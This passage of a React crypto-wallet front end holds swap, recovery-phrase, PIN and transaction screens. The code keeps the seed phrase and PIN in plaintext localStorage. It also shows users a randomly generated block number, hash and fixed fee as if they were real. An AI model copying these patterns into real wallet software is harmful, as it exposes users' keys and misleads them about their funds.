            {/* Кнопка копировать */}
            <button onClick={copy}
              style={{width:"100%", padding:"16px", borderRadius:16, border:"none",
                background: copied ? "#052e16" : `linear-gradient(135deg,${accentColor}ee,${accentColor}88)`,
                color: copied ? "#22C55E" : "#fff", fontSize:15, fontWeight:700, cursor:"pointer",
                display:"flex", alignItems:"center", justifyContent:"center", gap:8,
                outline: copied ? "1px solid #22C55E44" : "none", transition:"all 0.25s"}}>
              {copied ? <><Check size={18}/>Скопировано!</> : <><Copy size={18}/>Скопировать адрес</>}
            </button>
          </>
        )}

      </div>
    </Sheet>
  );
}

// ─── SWAP MODAL ───────────────────────────────────────────────────────────────
function SwapModal({ onClose, assets, prices, onSwap, addresses }) {
  const [fromSym,setFromSym]=useState(assets[0]?.sym||"ETH");
  const [toSym,setToSym]=useState(assets[1]?.sym||"BNB");
  const [amt,setAmt]=useState("");
  const [done,setDone]=useState(false);
  const [swapping,setSwapping]=useState(false);
  const [picking,setPicking]=useState(null);
  const [slippage,setSlippage]=useState("0.5");

  const fromAsset = assets.find(a=>a.sym===fromSym)||assets[0];
  const toAsset = assets.find(a=>a.sym===toSym)||assets[1];
  const fromPrice = prices[fromSym]||1;
  const toPrice = prices[toSym]||1;
  const rate = fromPrice/toPrice;
  const toAmt = amt ? (parseFloat(amt)*rate*(1-parseFloat(slippage)/100)).toFixed(6) : "";
  const priceImpact = parseFloat(amt) ? Math.min(0.1+parseFloat(amt)*fromPrice/100000,5).toFixed(2) : "0.00";
  const fee = parseFloat(amt) ? (parseFloat(amt)*fromPrice*0.003).toFixed(2) : "0.00";

  function flip(){
    setFromSym(toSym); setToSym(fromSym); setAmt("");
  }

  function doSwap(){
    if(!amt||parseFloat(amt)<=0)return;
    const num=parseFloat(amt);
    if(num>fromAsset.balance){alert("Insufficient balance");return;}
    setSwapping(true);
    (async () => {
      try {
        // Determine network: prefer shared network between fromSym and toSym
        const fromNets = ASSET_NETWORKS[fromSym] || [];
        const networkId = fromNets[0]?.id || fromSym.toLowerCase();
        const NET_TO_CHAIN = {
          eth:"ETH", bnb:"BNB", arb:"ARB", sol:"SOL", ton:"TON", ltc:"LTC",
        };
        const chainKey = NET_TO_CHAIN[networkId] || fromSym.toUpperCase();
        const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
        if (!storedMnemonic) throw new Error("Wallet not found in session");
        const privateKey = await getPrivateKey(storedMnemonic.split(" "), chainKey);
        if (!privateKey) throw new Error("Private key not available for " + chainKey);
        const walletAddress = addresses?.[fromSym] || "";
        const { txHash } = await executeSwap({
          fromSym, toSym, networkId,
          fromAmount: String(num),
          walletAddress,
          privateKeyHex: privateKey,
        });
        onSwap({fromSym,toSym,fromAmt:num,toAmt:parseFloat(toAmt),usd:num*fromPrice,txHash});
        setDone(true);
        setTimeout(onClose,2500);
      } catch(err) {
        setSwapping(false);
        alert("Swap failed: " + (err.message || err));
      }
    })();
  }

  if(picking) return (
    <Sheet onClose={()=>setPicking(null)} title={`Select ${picking==="from"?"You Pay":"You Get"}`}>
      <div style={{padding:"12px 24px",display:"flex",flexDirection:"column",gap:4}}>
        {assets.filter(a=>picking==="from"?a.sym!==toSym:a.sym!==fromSym).map(a=>(
          <button key={a.id} onClick={()=>{picking==="from"?setFromSym(a.sym):setToSym(a.sym);setPicking(null);setAmt("");}}
            style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:14,
              border:"none",background:"transparent",cursor:"pointer",textAlign:"left",transition:"background 0.15s",width:"100%"}}
            onMouseEnter={e=>e.currentTarget.style.background="#1a1a1a"}
            onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
            <CoinIcon asset={a} size={40}/>
            <div style={{flex:1}}>
              <p style={{fontSize:15,fontWeight:600,color:"#fff",margin:0}}>{a.name}</p>
              <p style={{fontSize:13,color:"rgba(255,255,255,0.4)",margin:0}}>{fmt(a.balance,6)} {a.sym}</p>
            </div>
            <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>{fmtUSD(a.balance*(prices[a.sym]||0))}</span>
          </button>
        ))}
      </div>
    </Sheet>
  );

  if(done) return (
    <Sheet onClose={onClose} title="">
      <div style={{padding:"48px 24px",textAlign:"center"}}>
        <div style={{fontSize:64,marginBottom:16}}>✅</div>
        <p style={{color:"#22C55E",fontSize:20,fontWeight:700,margin:0}}>Swap Complete!</p>
        <p style={{color:"rgba(255,255,255,0.6)",fontSize:15,margin:"10px 0 0"}}>
          {amt} {fromSym} → {toAmt} {toSym}
        </p>
        <p style={{color:"rgba(255,255,255,0.4)",fontSize:13,marginTop:6}}>Broadcasting to network…</p>
      </div>
    </Sheet>
  );

  return (
    <Sheet onClose={onClose} title="Swap">
      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:12}}>
        {/* From */}
        <div style={{background:"#1a1a1a",borderRadius:16,padding:"16px",border:"1px solid rgba(255,255,255,0.08)"}}>
          <div style={{display:"flex",justifyContent:"space-between",marginBottom:12}}>
            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>You Pay</span>
            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Bal: {fmt(fromAsset.balance,6)} {fromSym}</span>
          </div>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <button onClick={()=>setPicking("from")} style={{display:"flex",alignItems:"center",gap:8,
              background:"#111",borderRadius:12,padding:"8px 12px",border:"none",cursor:"pointer"}}>
              <CoinIcon asset={fromAsset} size={28}/>
              <span style={{fontSize:15,fontWeight:700,color:"#fff"}}>{fromSym}</span>
              <ChevronDown size={14} color="rgba(255,255,255,0.4)"/>
            </button>
            <input value={amt} onChange={e=>setAmt(e.target.value)} placeholder="0.00" type="number" min="0"
              style={{flex:1,background:"none",border:"none",outline:"none",color:"#fff",fontSize:24,fontWeight:700,textAlign:"right"}}/>
          </div>
          {amt&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)",margin:"8px 0 0",textAlign:"right"}}>≈ {fmtUSD(parseFloat(amt)*fromPrice)}</p>}
          <div style={{display:"flex",gap:6,marginTop:10}}>
            {["25%","50%","MAX"].map(p=>(
              <button key={p} onClick={()=>setAmt(fmtCrypto(fromAsset.balance*(p==="MAX"?1:parseInt(p)/100)))}
                style={{padding:"4px 10px",borderRadius:8,border:"1px solid rgba(255,255,255,0.1)",
                  background:"transparent",color:"rgba(255,255,255,0.5)",fontSize:11,cursor:"pointer"}}>{p}</button>
            ))}
          </div>
        </div>

        {/* Flip */}
        <div style={{display:"flex",justifyContent:"center"}}>
          <button onClick={flip} style={{width:40,height:40,borderRadius:"50%",background:"#222",
            border:"1px solid rgba(255,255,255,0.1)",cursor:"pointer",display:"flex",
            alignItems:"center",justifyContent:"center",transition:"transform 0.3s"}}
            onMouseEnter={e=>e.currentTarget.style.transform="rotate(180deg)"}
            onMouseLeave={e=>e.currentTarget.style.transform="rotate(0deg)"}>
            <ArrowLeftRight size={16} color="rgba(255,255,255,0.6)"/>
          </button>
        </div>

        {/* To */}
        <div style={{background:"#1a1a1a",borderRadius:16,padding:"16px",border:"1px solid rgba(255,255,255,0.08)"}}>
          <div style={{display:"flex",justifyContent:"space-between",marginBottom:12}}>
            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>You Get</span>
            <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Bal: {fmt(toAsset.balance,6)} {toSym}</span>
          </div>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <button onClick={()=>setPicking("to")} style={{display:"flex",alignItems:"center",gap:8,
              background:"#111",borderRadius:12,padding:"8px 12px",border:"none",cursor:"pointer"}}>
              <CoinIcon asset={toAsset} size={28}/>
              <span style={{fontSize:15,fontWeight:700,color:"#fff"}}>{toSym}</span>
              <ChevronDown size={14} color="rgba(255,255,255,0.4)"/>
            </button>
            <div style={{flex:1,textAlign:"right"}}>
              <span style={{fontSize:24,fontWeight:700,color:toAmt?"#22C55E":"rgba(255,255,255,0.2)"}}>{toAmt||"0.00"}</span>
            </div>
          </div>
          {toAmt&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)",margin:"8px 0 0",textAlign:"right"}}>≈ {fmtUSD(parseFloat(toAmt)*toPrice)}</p>}
        </div>

        {/* Rate & Details */}
        {amt&&(
          <div style={{background:"#0d0d0d",borderRadius:12,padding:"12px 14px",display:"flex",flexDirection:"column",gap:8}}>
            <div style={{display:"flex",justifyContent:"space-between"}}>
              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Rate</span>
              <span style={{fontSize:12,color:"#fff"}}>1 {fromSym} = {rate.toFixed(6)} {toSym}</span>
            </div>
            <div style={{display:"flex",justifyContent:"space-between"}}>
              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Price Impact</span>
              <span style={{fontSize:12,color:parseFloat(priceImpact)>1?"#F59E0B":"#22C55E"}}>{priceImpact}%</span>
            </div>
            <div style={{display:"flex",justifyContent:"space-between"}}>
              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>DEX Fee (0.3%)</span>
              <span style={{fontSize:12,color:"#fff"}}>{fmtUSD(parseFloat(fee))}</span>
            </div>
            <div style={{display:"flex",justifyContent:"space-between"}}>
              <span style={{fontSize:12,color:"rgba(255,255,255,0.4)"}}>Slippage</span>
              <div style={{display:"flex",gap:4}}>
                {["0.1","0.5","1.0"].map(s=>(
                  <button key={s} onClick={()=>setSlippage(s)} style={{padding:"2px 8px",borderRadius:6,border:"none",
                    background:slippage===s?"#2563eb":"rgba(255,255,255,0.08)",
                    color:slippage===s?"#fff":"rgba(255,255,255,0.5)",fontSize:11,cursor:"pointer"}}>{s}%</button>
                ))}
              </div>
            </div>
          </div>
        )}

        <button onClick={doSwap} disabled={!amt||swapping||parseFloat(amt)<=0}
          style={{width:"100%",padding:"17px",borderRadius:16,border:"none",marginTop:4,
            background:!amt||swapping?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#D97706,#F59E0B)",
            color:!amt||swapping?"rgba(255,255,255,0.3)":"#fff",
            fontSize:16,fontWeight:600,cursor:"pointer",
            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
          {swapping?<><RefreshCw size={18} style={{animation:"spin 1s linear infinite"}}/>Swapping…</>:
            <>⚡ Swap {fromSym} → {toSym}</>}
        </button>
      </div>
    </Sheet>
  );
}

// ─── ASSET DETAIL ─────────────────────────────────────────────────────────────
function AssetDetail({ asset, prices, onClose, onSend, onReceive }) {
  const price = prices[asset.sym]||asset.price||0;
  const val = asset.balance*price;
  const pos = asset.chg>=0;
  const pts = Array.from({length:20},(_,i)=>{
    const y=50+Math.sin(i*0.7)*15+(pos?i*1.5:-i);
    return `${(i/19)*260},${Math.max(10,Math.min(90,y))}`;
  }).join(" ");
  return (
    <Sheet onClose={onClose} title={asset.name}>
      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:16}}>
        <div style={{display:"flex",alignItems:"center",gap:14}}>
          <CoinIcon asset={asset} size={52}/>
          <div>
            <p style={{fontSize:28,fontWeight:700,color:"#fff",margin:0,letterSpacing:"-0.03em"}}>{fmtUSD(val)}</p>
            <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:0}}>{fmt(asset.balance,6)} {asset.sym}
              <span style={{color:pos?"#22C55E":"#EF4444",marginLeft:8,fontWeight:600}}>{pos?"+":""}{asset.chg?.toFixed(2)}%</span>
            </p>
          </div>
        </div>
        <div style={{background:"#0d0d0d",borderRadius:16,padding:"16px 8px"}}>
          <svg width="100%" viewBox="0 0 260 100" preserveAspectRatio="none" style={{height:80}}>
            <defs><linearGradient id={`g${asset.id}`} x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor={asset.color} stopOpacity="0.3"/>
              <stop offset="100%" stopColor={asset.color} stopOpacity="0"/>
            </linearGradient></defs>
            <polygon points={`0,100 ${pts} 260,100`} fill={`url(#g${asset.id})`}/>
            <polyline points={pts} fill="none" stroke={asset.color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
          {[["Price",fmtUSD(price)],["24h",`${pos?"+":""}${asset.chg?.toFixed(2)}%`],
            ["Balance",`${fmt(asset.balance,6)} ${asset.sym}`],["Value",fmtUSD(val)]].map(([k,v])=>(
            <div key={k} style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px"}}>
              <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 3px"}}>{k}</p>
              <p style={{fontSize:14,fontWeight:700,color:k==="24h"?(pos?"#22C55E":"#EF4444"):"#fff",margin:0}}>{v}</p>
            </div>
          ))}
        </div>
        <div style={{display:"flex",gap:10}}>
          <button onClick={()=>{onClose();onSend();}} style={{flex:1,padding:"16px",borderRadius:14,border:"none",
            background:"#2563eb",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer",
            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
            <ArrowUpRight size={16}/>Send
          </button>
          <button onClick={()=>{onClose();onReceive();}} style={{flex:1,padding:"16px",borderRadius:14,border:"none",
            background:"#7c3aed",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer",
            display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
            <ArrowDownLeft size={16}/>Receive
          </button>
        </div>
      </div>
    </Sheet>
  );
}

// ─── TX DETAIL ────────────────────────────────────────────────────────────────
function TxDetail({ tx, onClose }) {
  const [copied,setCopied]=useState(false);
  const icons={receive:ArrowDownLeft,send:ArrowUpRight,swap:ArrowLeftRight};
  const Icon=icons[tx.type]||ArrowUpRight;
  const statusColors={confirmed:"#22C55E",pending:"#F59E0B",failed:"#EF4444"};
  const status = tx.status||"confirmed";
  return (
    <Sheet onClose={onClose} title="Transaction Details">
      <div style={{padding:"20px 24px",display:"flex",flexDirection:"column",gap:10}}>
        <div style={{textAlign:"center",padding:"12px 0 20px"}}>
          <div style={{width:56,height:56,borderRadius:"50%",
            background:tx.type==="send"?"#2d0c0c":tx.type==="receive"?"#052e16":"#0d1033",
            display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 10px",
            border:`1px solid ${tx.color}44`}}>
            <Icon size={24} color={tx.color}/>
          </div>
          <p style={{fontSize:24,fontWeight:700,color:tx.type==="send"?"#EF4444":"#22C55E",margin:0}}>{tx.usd}</p>
          <p style={{fontSize:14,color:"rgba(255,255,255,0.4)",margin:"4px 0 0",textTransform:"capitalize"}}>{tx.type} · {tx.label}</p>
          <div style={{display:"inline-flex",alignItems:"center",gap:6,background:statusColors[status]+"22",
            borderRadius:20,padding:"4px 12px",marginTop:10,border:`1px solid ${statusColors[status]}44`}}>
            <div style={{width:6,height:6,borderRadius:"50%",background:statusColors[status]}}/>
            <span style={{fontSize:12,color:statusColors[status],fontWeight:600,textTransform:"capitalize"}}>{status}</span>
          </div>
        </div>
        {[["Status",status==="confirmed"?"✅ Confirmed":status==="pending"?"⏳ Pending":"❌ Failed"],
          ["Time",tx.time],["Address",tx.addr],["Fee","~$0.84"],
          ["Block",tx.block||"#"+Math.floor(19000000+Math.random()*500000).toLocaleString()]].map(([k,v])=>(
          <div key={k} style={{display:"flex",justifyContent:"space-between",padding:"12px 16px",background:"#1a1a1a",borderRadius:12}}>
            <span style={{fontSize:13,color:"rgba(255,255,255,0.45)"}}>{k}</span>
            <span style={{fontSize:13,color:"#fff",fontWeight:500}}>{v}</span>
          </div>
        ))}
        <div style={{background:"#1a1a1a",borderRadius:12,padding:"12px 16px"}}>
          <p style={{fontSize:11,color:"rgba(255,255,255,0.35)",margin:"0 0 4px"}}>TX Hash</p>
          <p style={{fontSize:11,color:"rgba(255,255,255,0.6)",margin:0,fontFamily:"monospace",wordBreak:"break-all"}}>{tx.hash||genTxHash()}</p>
        </div>
        <button onClick={()=>{
            if(tx.hash&&navigator.clipboard)navigator.clipboard.writeText(tx.hash);
            setCopied(true);setTimeout(()=>setCopied(false),2000);
          }}
          style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid rgba(255,255,255,0.1)",
            background:"rgba(255,255,255,0.04)",color:copied?"#22C55E":"rgba(255,255,255,0.6)",
            fontSize:14,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
          {copied?<><Check size={15}/>Copied!</>:<><Copy size={15}/>Copy TX Hash</>}
        </button>
      </div>
    </Sheet>
  );
}

// ─── SETTINGS MODALS ──────────────────────────────────────────────────────────
function RecoveryModal({ onClose, mnemonic }) {
  const [rev,setRev]=useState(false);
  const [cop,setCop]=useState(false);
  return (
    <Sheet onClose={onClose} title="Recovery Phrase">
      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:14}}>
        <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)"}}>
          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0,lineHeight:1.6}}>
            ⚠ Never share your seed phrase. Anyone with these words has full access to your wallet.
          </p>
        </div>
        <div style={{background:"#0a0a0a",borderRadius:16,padding:16,position:"relative",overflow:"hidden"}}>
          {!rev&&(
            <div style={{position:"absolute",inset:0,backdropFilter:"blur(12px)",background:"rgba(0,0,0,0.7)",
              borderRadius:16,zIndex:10,display:"flex",flexDirection:"column",alignItems:"center",
              justifyContent:"center",gap:10}}>
              <Lock size={22} color="rgba(255,255,255,0.4)"/>
              <button onClick={()=>setRev(true)} style={{padding:"10px 24px",borderRadius:12,
                border:"1px solid rgba(255,255,255,0.15)",background:"rgba(255,255,255,0.08)",
                color:"#fff",fontSize:13,fontWeight:500,cursor:"pointer"}}>Tap to Reveal</button>
            </div>
          )}
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,filter:rev?"none":"blur(8px)"}}>
            {mnemonic.map((w,i)=>(
              <div key={i} style={{background:"#161616",borderRadius:8,padding:"7px 10px",
                display:"flex",alignItems:"center",gap:6,border:"1px solid rgba(255,255,255,0.06)"}}>
                <span style={{fontSize:10,color:"rgba(255,255,255,0.25)",minWidth:14}}>{i+1}</span>
                <span style={{fontSize:12,color:"#fff",fontWeight:500}}>{w}</span>
              </div>
            ))}
          </div>
        </div>
        {rev&&<button onClick={()=>{
            navigator.clipboard&&navigator.clipboard.writeText(mnemonic.join(" "));
            setCop(true);setTimeout(()=>setCop(false),2000);
          }}
          style={{width:"100%",padding:"14px",borderRadius:14,border:"1px solid rgba(255,255,255,0.1)",
            background:"rgba(255,255,255,0.04)",color:cop?"#22C55E":"rgba(255,255,255,0.6)",
            fontSize:14,fontWeight:500,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",gap:8}}>
          {cop?<><Check size={15}/>Copied!</>:<><Copy size={15}/>Copy to Clipboard</>}
        </button>}
      </div>
    </Sheet>
  );
}

function NotifModal({ onClose }) {
  const [s,setS]=useState({price:true,tx:true,news:false,security:true});
  return (
    <Sheet onClose={onClose} title="Notifications">
      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:4}}>
        {[["price","Price Alerts","Big price changes"],["tx","Transactions","Incoming & outgoing"],
          ["news","Market News","Daily summaries"],["security","Security Alerts","Unusual activity"]].map(([k,l,sub])=>(
          <div key={k} style={{display:"flex",alignItems:"center",gap:14,padding:"14px 0",borderBottom:"1px solid rgba(255,255,255,0.04)"}}>
            <div style={{flex:1}}>
              <p style={{fontSize:14,fontWeight:500,color:"#fff",margin:0}}>{l}</p>
              <p style={{fontSize:12,color:"rgba(255,255,255,0.35)",margin:0}}>{sub}</p>
            </div>
            <div onClick={()=>setS(x=>({...x,[k]:!x[k]}))}
              style={{width:48,height:28,borderRadius:14,background:s[k]?"#2563eb":"#333",
                cursor:"pointer",transition:"background 0.2s",position:"relative",flexShrink:0}}>
              <div style={{width:22,height:22,borderRadius:"50%",background:"#fff",
                position:"absolute",top:3,left:s[k]?22:3,transition:"left 0.2s"}}/>
            </div>
          </div>
        ))}
        <button onClick={onClose} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",
          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,
          fontWeight:600,cursor:"pointer",marginTop:12}}>Save Settings</button>
      </div>
    </Sheet>
  );
}

function NetworkModal({ onClose, network, onSetNetwork }) {
  const [sel,setSel]=useState(network);
  const nets=[
    {id:"mainnet",l:"Ethereum Mainnet",s:"Chain ID: 1",c:"#8B9CF7"},
    {id:"arbitrum",l:"Arbitrum One",s:"Chain ID: 42161",c:"#28A0F0"},
    {id:"polygon",l:"Polygon",s:"Chain ID: 137",c:"#8247E5"},
    {id:"bsc",l:"BNB Smart Chain",s:"Chain ID: 56",c:"#F3BA2F"},
    {id:"sol",l:"Solana Mainnet",s:"Mainnet Beta",c:"#B57BFF"},
  ];
  return (
    <Sheet onClose={onClose} title="Network">
      <div style={{padding:"12px 24px",display:"flex",flexDirection:"column",gap:6}}>
        {nets.map(n=>(
          <button key={n.id} onClick={()=>setSel(n.id)}
            style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:14,
              border:`1px solid ${sel===n.id?n.c+"44":"transparent"}`,
              background:sel===n.id?`${n.c}11`:"transparent",cursor:"pointer",textAlign:"left",width:"100%"}}>
            <div style={{width:10,height:10,borderRadius:"50%",background:n.c,flexShrink:0,boxShadow:`0 0 8px ${n.c}`}}/>
            <div style={{flex:1}}>
              <p style={{fontSize:14,fontWeight:600,color:"#fff",margin:0}}>{n.l}</p>
              <p style={{fontSize:12,color:"rgba(255,255,255,0.4)",margin:0}}>{n.s}</p>
            </div>
            {sel===n.id&&<Check size={16} color={n.c}/>}
          </button>
        ))}
        <button onClick={()=>{onSetNetwork(sel);onClose();}} style={{width:"100%",padding:"16px",borderRadius:16,border:"none",
          background:"linear-gradient(135deg,#2563eb,#7c3aed)",color:"#fff",fontSize:15,
          fontWeight:600,cursor:"pointer",marginTop:8}}>Apply Network</button>
      </div>
    </Sheet>
  );
}

function ChangePinModal({ onClose, onChangePin }) {
  const [step,setStep]=useState("old"); // old | new | confirm
  const [old,setOld]=useState([]);
  const [newPin,setNewPin]=useState([]);
  const [confirmPin,setConfirmPin]=useState([]);
  const [error,setError]=useState("");
  const [savedPin,] = useState(()=>localStorage.getItem(storageKey("gem_pin"))||"");

  function press(d, which, setter, current) {
    if(current.length>=6)return;
    const next=[...current,d];
    setter(next);
    if(next.length===6) {
      setTimeout(()=>{
        if(which==="old") {
          if(!savedPin||next.join("")===savedPin){setStep("new");setOld(next);}
          else{setError("Wrong PIN");setter([]);}
        } else if(which==="new") {
          setStep("confirm");setNewPin(next);
        } else {
          if(next.join("")===newPin.join("")){
            onChangePin(next.join(""));onClose();
          } else {
            setError("PINs don't match");setter([]);setStep("new");setNewPin([]);
          }
        }
      },150);
    }
  }

  const titles={old:"Current PIN",new:"New PIN",confirm:"Confirm New PIN"};
  const descs={old:"Enter your current PIN",new:"Choose a new 6-digit PIN",confirm:"Confirm your new PIN"};
  const which=step;
  const current=which==="old"?old:which==="new"?newPin:confirmPin;
  const setter=which==="old"?setOld:which==="new"?setNewPin:setConfirmPin;

  return (
    <Sheet onClose={onClose} title="Change PIN">
      <div style={{padding:"32px 24px",display:"flex",flexDirection:"column",alignItems:"center",gap:20}}>
        <div><p style={{fontSize:16,fontWeight:600,color:"#fff",margin:"0 0 4px",textAlign:"center"}}>{titles[step]}</p>
          <p style={{fontSize:13,color:"rgba(255,255,255,0.4)",margin:0,textAlign:"center"}}>{descs[step]}</p></div>
        {error&&<p style={{color:"#EF4444",fontSize:13,margin:0}}>{error}</p>}
        <div style={{display:"flex",gap:12}}>
          {Array.from({length:6},(_,i)=>(
            <div key={i} style={{width:14,height:14,borderRadius:"50%",
              background:i<current.length?"#2563eb":"rgba(255,255,255,0.15)",
              transition:"background 0.15s",border:"1.5px solid rgba(255,255,255,0.1)"}}/>
          ))}
        </div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,maxWidth:280,width:"100%"}}>
          {[1,2,3,4,5,6,7,8,9,"",0,"⌫"].map((k,i)=>(
            <button key={i} onClick={()=>k==="⌫"?setter(c=>c.slice(0,-1)):k!==""?press(String(k),which,setter,current):null}
              disabled={k===""}
              style={{height:64,borderRadius:16,border:"none",
                background:k===""?"transparent":k==="⌫"?"rgba(255,255,255,0.06)":"rgba(255,255,255,0.08)",
                color:"#fff",fontSize:k==="⌫"?18:22,fontWeight:500,cursor:k===""?"default":"pointer"}}>
              {k}
            </button>
          ))}
        </div>
      </div>
    </Sheet>
  );
}

// ─── WALLET TAB ───────────────────────────────────────────────────────────────
function WalletTab({ assets, prices, liveStatus, onSend, onReceive, onSwap, onBuy, onRefresh }) {
  const [hidden,setHidden]=useState(false);
  const [selAsset,setSelAsset]=useState(null);
  const total = assets.reduce((s,a)=>s+a.balance*(prices[a.sym]||0),0);
  const totalChg = assets.reduce((s,a)=>s+(a.chg||0)*a.balance*(prices[a.sym]||0),0)/total;

  return (
    <div style={{padding:"0 16px 100px"}}>
      {selAsset&&<AssetDetail asset={selAsset} prices={prices} onClose={()=>setSelAsset(null)} onSend={onSend} onReceive={onReceive}/>}
      <div style={{textAlign:"center",padding:"8px 0 28px",animation:"fadeUp 0.5s ease both"}}>
        <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:8,marginBottom:4}}>
          <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>Total Balance</span>
          <button onClick={()=>setHidden(h=>!h)} style={{background:"none",border:"none",cursor:"pointer",padding:2}}>
            {hidden?<EyeOff size={14} color="rgba(255,255,255,0.3)"/>:<Eye size={14} color="rgba(255,255,255,0.3)"/>}
          </button>
          <button onClick={onRefresh} style={{background:"none",border:"none",cursor:"pointer",padding:2}}>
            <RefreshCw size={13} color={liveStatus==="loading"?"#2563eb":"rgba(255,255,255,0.3)"} style={{animation:liveStatus==="loading"?"spin 1s linear infinite":"none"}}/>
          </button>
        </div>
        <p style={{fontSize:40,fontWeight:700,color:"#fff",margin:"0 0 6px",
          letterSpacing:"-0.03em",filter:hidden?"blur(10px)":"none",transition:"filter 0.3s"}}>
          {hidden?"$••••••":fmtUSD(total)}
        </p>
        <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:6}}>
          {totalChg>=0?<TrendingUp size={14} color="#22C55E"/>:<TrendingDown size={14} color="#EF4444"/>}
          <span style={{fontSize:13,color:totalChg>=0?"#22C55E":"#EF4444",fontWeight:600}}>
            {totalChg>=0?"+":""}{totalChg.toFixed(2)}% 24h
          </span>
          {liveStatus==="live"&&<span style={{fontSize:10,color:"#22C55E",background:"#22C55E22",borderRadius:20,padding:"1px 6px"}}>LIVE</span>}
        </div>
      </div>
      <div style={{display:"flex",justifyContent:"space-around",padding:"0 8px",marginBottom:32}}>
        <ActionBtn icon={<ArrowUpRight size={22} color="#fff"/>} label="Send" onClick={onSend} color="#2563EB"/>
        <ActionBtn icon={<ArrowDownLeft size={22} color="#fff"/>} label="Receive" onClick={onReceive} color="#7c3aed"/>
        <ActionBtn icon={<CreditCard size={22} color="#fff"/>} label="Buy" onClick={onBuy} color="#059669"/>
        <ActionBtn icon={<ArrowLeftRight size={22} color="#fff"/>} label="Swap" onClick={onSwap} color="#D97706"/>
      </div>
      <span style={{fontSize:15,fontWeight:600,color:"#fff",display:"block",marginBottom:14,padding:"0 4px"}}>Assets</span>
      <div style={{display:"flex",flexDirection:"column",gap:2}}>
        {assets.map((a,i)=>{
          const price=prices[a.sym]||0;
          const val=a.balance*price;
          const pos=a.chg>=0;
          return (
            <div key={a.id} onClick={()=>setSelAsset(a)}
              style={{display:"flex",alignItems:"center",gap:14,padding:"14px 16px",borderRadius:16,
                cursor:"pointer",transition:"background 0.15s",
                animation:`fadeUp 0.45s ${0.05*i}s ease both`,opacity:0,animationFillMode:"forwards"}}
              onMouseEnter={e=>e.currentTarget.style.background="#161616"}
              onMouseLeave={e=>e.currentTarget.style.background="transparent"}>
              <CoinIcon asset={a}/>
              <div style={{flex:1,minWidth:0}}>
                <div style={{display:"flex",justifyContent:"space-between"}}>
                  <span style={{fontSize:15,fontWeight:600,color:"#fff"}}>{a.name}</span>
                  <span style={{fontSize:15,fontWeight:600,color:"#fff",filter:hidden?"blur(8px)":"none"}}>{hidden?"••••":fmtUSD(val)}</span>
                </div>
                <div style={{display:"flex",justifyContent:"space-between",marginTop:3}}>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>
                    {fmtUSD(price)}<span style={{color:pos?"#22C55E":"#EF4444",marginLeft:4,fontWeight:500}}>{pos?"+":""}{a.chg?.toFixed(2)}%</span>
                  </span>
                  <span style={{fontSize:13,color:"rgba(255,255,255,0.4)"}}>{hidden?"••••":`${fmt(a.balance,6)} ${a.sym}`}</span>
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}


// ─── ACTIVITY TAB ─────────────────────────────────────────────────────────────
function ActivityTab({ txHistory }) {
  const [sel,setSel]=useState(null);
  const [filter,setFilter]=useState("all");
  const icons={receive:ArrowDownLeft,send:ArrowUpRight,swap:ArrowLeftRight};
  const bg={receive:"#052e16",send:"#2d0c0c",swap:"#0d1033"};
  const filtered = filter==="all"?txHistory:txHistory.filter(t=>t.type===filter);

  return (
    <div style={{padding:"0 16px 100px"}}>
      {sel&&<TxDetail tx={sel} onClose={()=>setSel(null)}/>}
      <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:16,padding:"0 4px",flexWrap:"wrap"}}>
        <span style={{fontSize:15,fontWeight:600,color:"#fff",flex:1}}>Activity</span>
        {["all","send","receive","swap"].map(f=>(
          <button key={f} onClick={()=>setFilter(f)}
            style={{padding:"6px 12px",borderRadius:20,border:"none",cursor:"pointer",fontSize:12,fontWeight:600,
